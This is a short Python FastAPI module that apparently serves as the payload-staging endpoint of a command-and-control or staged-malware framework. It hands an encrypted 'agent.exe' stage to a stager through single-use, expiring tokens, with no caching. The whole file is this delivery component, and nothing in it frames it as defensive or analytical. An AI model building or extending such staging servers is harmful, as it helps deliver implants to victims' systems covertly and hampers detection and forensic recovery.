"""
GET /api/stage/{token} — serve encrypted stage to stager.

Wire format: nonce(12) | ciphertext | tag(16)  [ChaCha20-Poly1305]
Token is a 64-char hex string stored in the in-memory registry below.
Tokens expire after 24 h and are single-use.
"""
from __future__ import annotations
import os
import time
from typing import Optional

from fastapi import APIRouter, HTTPException
from fastapi.responses import Response

router = APIRouter(tags=["stage"])

# token (hex64) → {"blob": bytes, "expires": float}
_stages: dict[str, dict] = {}
_TTL = 86400  # 24 h


def register_stage(token: str, blob: bytes) -> None:
    """Called by build.py after encrypting agent.exe."""
    _stages[token] = {"blob": blob, "expires": time.time() + _TTL}
    _evict()


def _evict() -> None:
    now = time.time()
    dead = [t for t, v in _stages.items() if v["expires"] < now]
    for t in dead:
        del _stages[t]


@router.get("/api/stage/{token}")
async def get_stage(token: str):
    _evict()
    entry = _stages.get(token)
    if not entry:
        raise HTTPException(404, "stage not found or expired")

    blob = entry["blob"]
    # Single-use: remove after serving
    del _stages[token]

    return Response(
        content=blob,
        media_type="application/octet-stream",
        headers={"Cache-Control": "no-store"},
    )
